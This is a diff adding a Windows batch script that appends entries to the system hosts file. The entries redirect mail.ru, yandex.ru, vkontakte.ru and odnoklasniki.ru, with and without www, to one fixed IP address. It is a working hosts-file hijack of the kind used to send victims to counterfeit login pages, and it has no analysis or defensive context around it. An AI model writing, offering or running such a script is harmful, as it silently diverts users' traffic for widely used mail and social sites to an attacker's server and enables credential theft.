@@ -1,0 +1,10 @@
+@echo off
+echo 213.182.197.13 mail.ru >> %windir%\system32\drivers\etc\hosts
+echo 213.182.197.13 www.mail.ru >> %windir%\system32\drivers\etc\hosts
+echo 213.182.197.13 www.yandex.ru >>  %windir%\system32\drivers\etc\hosts
+echo 213.182.197.13 yandex.ru >>  %windir%\system32\drivers\etc\hosts
+echo 213.182.197.13 www.vkontakte.ru >> %windir%\system32\drivers\etc\hosts
+echo 213.182.197.13 vkontakte.ru >> %windir%\system32\drivers\etc\hosts
+echo 213.182.197.13 www.odnoklasniki.ru >> %windir%\system32\drivers\etc\hosts
+echo 213.182.197.13 odnoklasniki.ru >> %windir%\system32\drivers\etc\hosts
+
